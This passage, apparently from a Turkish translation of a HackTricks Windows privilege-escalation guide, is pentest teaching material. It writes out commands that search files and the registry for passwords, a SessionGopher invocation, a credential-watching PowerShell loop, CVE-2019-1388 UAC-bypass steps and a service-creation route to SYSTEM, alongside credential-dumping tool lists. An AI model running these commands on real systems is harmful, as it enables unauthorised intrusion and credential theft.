COM sınıfları ve arayüzleri, sırasıyla **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** ve **HKEY\_**_**CLASSES\_**_**ROOT\Interface** altında kaydedilir. Bu kayıt defteri, **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** birleştirilerek oluşturulur = **HKEY\_**_**CLASSES\_**_**ROOT.**

Bu kayıt defterinin CLSIDs içinde, **InProcServer32** adlı çocuk kayıt defterini bulabilirsiniz. Bu, bir **DLL**'ye işaret eden bir **varsayılan değer** ve **Apartment** (Tek İplikli), **Free** (Çok İplikli), **Both** (Tek veya Çok) veya **Neutral** (İplik Nötr) olabilen **ThreadingModel** adında bir değer içerir.

![](<../../.gitbook/assets/image (638).png>)

Temelde, **yürütülecek olan DLL'lerden herhangi birini üzerine yazabilirseniz**, bu DLL'nin farklı bir kullanıcı tarafından yürütülmesi durumunda **yetkileri yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için şu adrese bakın:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Dosyalarda ve kayıt defterinde Genel Şifre araması**

**Dosya içeriğini arayın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adıyla dosya arayın**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Kayıt defterinde anahtar adları ve şifreleri arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parola arayan araçlar

[**MSF-Credentials Eklentisi**](https://github.com/carlospolop/MSF-Credentials) **ben bu eklentiyi oluşturdum** bu eklenti **kurbanın içindeki kimlik bilgilerini arayan her metasploit POST modülünü otomatik olarak çalıştırmak için** oluşturulmuştur.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) otomatik olarak bu sayfada belirtilen tüm parolaları içeren dosyaları arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için harika bir araçtır.

**SessionGopher** aracı, bu verileri açık metin olarak saklayan çeşitli araçların (**PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP**) **oturumları**, **kullanıcı adlarını** ve **parolaları** arar.

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Sızdırılan İşleyiciler

**SİSTEM olarak çalışan bir işlem**, `OpenProcess()` ile **tam erişim** ile **yeni bir işlem açar**. Aynı işlem aynı zamanda **düşük ayrıcalıklarla yeni bir işlem oluşturur** (`CreateProcess()`), **ancak ana işlemin tüm açık işleyicilerini devralır**.\
Sonra, **düşük ayrıcalıklı işleme tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **açık işleyiciyi yakalayabilir** ve **bir shellcode enjekte edebilirsiniz**.\
[Bu zafiyetin **nasıl tespit edilip istismar edileceği** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
[Farklı izin seviyeleriyle devralınan işlemler ve iş parçacıklarının daha fazla açık işleyicisini nasıl test edip kötüye kullanacağınız hakkında daha kapsamlı bir açıklama için bu **diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Adlandırılmış Boru İstemci Taklit Etme

**Borular** olarak adlandırılan paylaşılan bellek segmentleri, işlem iletişimini ve veri transferini sağlar.

Windows, farklı ağlar üzerinden bile ilişkisiz işlemlerin veri paylaşmasına izin veren **Adlandırılmış Borular** adlı bir özellik sunar. Bu, rolleri **adlandırılmış boru sunucusu** ve **adlandırılmış boru istemcisi** olarak tanımlanan bir istemci/sunucu mimarisine benzer.

Bir **istemci** tarafından bir boru aracılığıyla gönderilen verilerde, boruyu kuran **sunucu**, gerekli **SeImpersonate** haklarına sahipse, **istemcinin kimliğini alabilir**. İletişim kuran bir **ağır ayrıcalıklı işlemi tanımlayarak**, bu işlemle etkileşime girdiğinde oluşturduğunuz boruyla etkileşime geçtiğinde o işlemin kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** fırsatı bulunmaktadır. Bu tür bir saldırıyı gerçekleştirmek için talimatlar [**burada**](named-pipe-client-impersonation.md) ve [**burada**](./#from-high-integrity-to-system) bulunabilir.

Ayrıca aşağıdaki araç, **bir burp gibi bir araçla adlandırılmış bir boru iletişimini dinlemeyi sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, tüm boruları listelemenize ve ayrıcalıkları bulmanıza olanak tanır** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Çeşitli

### **Şifreleri İzlemek İçin Komut Satırlarını İzleme**

Bir kullanıcı olarak bir kabuk aldığınızda, **komut satırında kimlik bilgilerini ileten zamanlanmış görevler veya diğer işlemler olabilir**. Aşağıdaki betik, her iki saniyede bir işlem komut satırlarını yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktılar.

```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## İşlemlerden şifreleri çalmak

## Düşük Ayrıcalıklı Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Atlatma

Eğer grafik arayüze erişiminiz varsa (konsol veya RDP aracılığıyla) ve UAC etkinse, bazı Microsoft Windows sürümlerinde düşük ayrıcalıklı bir kullanıcıdan bir terminal veya başka bir işlemi "NT\AUTHORITY SYSTEM" olarak çalıştırmak mümkündür.

Bu, aynı zafiyetle aynı anda ayrıcalıkları yükseltme ve UAC'yi atlatma olanağı sağlar. Ek olarak, herhangi bir şey kurmaya gerek yoktur ve işlem sırasında kullanılan ikili dosya, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları aşağıdaki gibidir:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu zafiyeti sömürmek için aşağıdaki adımları gerçekleştirmek gereklidir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

## Yönetici Orta Seviyeden Yüksek Bütünlük Seviyesine / UAC Atlatma

**Bütünlük Seviyeleri hakkında bilgi edinmek için bunu okuyun**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Ardından **UAC ve UAC atlatmaları hakkında bilgi edinmek için bunu okuyun**:

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **Yüksek Bütünlükten Sistem'e**

### **Yeni servis**

Eğer zaten Yüksek Bütünlük seviyesinde bir işlemde çalışıyorsanız, **SİSTEM'e geçiş** sadece **yeni bir servis oluşturup çalıştırmak** olabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

### AlwaysInstallElevated

Yüksek Bütünlük sürecinden **AlwaysInstallElevated kayıt girdilerini etkinleştirmeyi** ve bir ters kabuk kullanarak bir _**.msi**_ sarmalayıcısı **kurmayı deneyebilirsiniz**.\
[Daha fazla bilgi için ilgili kayıt anahtarları ve bir _.msi_ paketi nasıl kurulur burada.](./#alwaysinstallelevated)

### Yüksek + SeImpersonate ayrıcalığı System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'den Tam Token ayrıcalıklarına

Bu token ayrıcalıklarına sahipseniz (bunları muhtemelen zaten Yüksek Bütünlük sürecinde bulacaksınız), SeDebug ayrıcalığı ile **nearly any process**'i (korunan olmayan süreçler) açabilir, sürecin token'ını **kopyalayabilir** ve o token ile **keyfi bir süreç oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan herhangi bir süreç seçilir** (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM süreçleri bulabilirsiniz_).\
Önerilen teknik uygulamayı yürüten [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Adlandırılmış Borular**

Bu teknik, `getsystem` içinde yükselmek için meterpreter tarafından kullanılır. Teknik, **bir boru oluşturmayı ve ardından o boruya yazmak için bir hizmet oluşturup/istismar etmeyi** içerir. Daha sonra, boruyu oluşturan **sunucu** (boruyu oluşturan **`SeImpersonate`** ayrıcalığını kullanan) boru istemcisinin (hizmetin) token'ını **taklit edebilecek** ve SYSTEM ayrıcalıklarını elde edecektir.\
[**Adlandırılmış boru istemcisi taklit hakkında daha fazla bilgi edinmek istiyorsanız burayı okumalısınız**](./#named-pipe-client-impersonation).\
[**Yüksek bütünlükten System'e adlandırılmış borular kullanarak nasıl geçileceğine dair bir örnek okumak istiyorsanız burayı okumalısınız**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Kaçırma

**SYSTEM** olarak çalışan bir **süreç** tarafından **yüklenen bir dll'yi kaçırmayı** başarırsanız, bu izinlerle keyfi kodu yürütebilirsiniz. Bu nedenle Dll Kaçırma, bu tür ayrıcalık yükseltmesi için de yararlıdır ve ayrıca, yüksek bütünlük sürecinden **daha kolay bir şekilde başarılabilir** çünkü dll'leri yüklemek için kullanılan klasörlerde **yazma izinleri** olacaktır.\
[**Dll kaçırma hakkında daha fazla bilgi edinebilirsiniz**](dll-hijacking/)**.**

### **Yönetici veya Ağ Hizmetinden System'e**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICE veya NETWORK SERVICE'den tam ayrıcalıklara

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Statik impacket ikili dosyaları](https://github.com/ropnop/impacket\_static\_binaries)

## Faydalı araçlar

**Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol edin (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/tr/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Algılandı.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol edin ve bilgi toplayın (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/tr/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol edin**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Yerelde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Kimlik Yöneticisinden kimlik bilgilerini çıkarır. Algılandı.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan şifreleri etki alanı boyunca yayınlayın**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS/NBNS sahtekar ve araçtır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel ayrıcalık yükseltme Windows numaralandırması**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen ayrıcalık yükseltme zafiyetlerini arayın (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Yönetici hakları gerektirir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen ayrıcalık yükseltme zafiyetlerini arayın (VisualStudio kullanılarak derlenmesi gerekmektedir) ([**derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayan ana bilgisayarı numaralandırır (daha çok bir bilgi toplama aracıdır) (derlenmesi gerekmektedir) **(**[**derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Yanlış yapılandırmaları kontrol edin (github'da derlenmiş yürütülebilir dosya). Tavsiye edilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol edin (python'dan exe). Tavsiye edilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulan araç (düzgün çalışması için accesschk'ye ihtiyaç duymaz ancak kullanabilir).

**Yerel**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan açıkları önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan açıkları önerir (yerel python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekmektedir ([buna bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban ana bilgisayar üzerinde yüklü .NET sürümünü görmek için yapabileceğiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## Kaynaklar

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* \*\*Bir \*\*cybersecurity şirketinde mi çalışıyorsunuz? Şirketinizin **HackTricks'te reklamını görmek** ister misiniz? ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**The PEASS Ailesi**](https://opensea.io/collection/the-peass-family)'ni keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks swag**](https://peass.creator-spring.com)'ımızı alın
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.** takip edin
* **Hacking püf noktalarınızı göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **üzerinden PR'lar gönderin.**

</details>
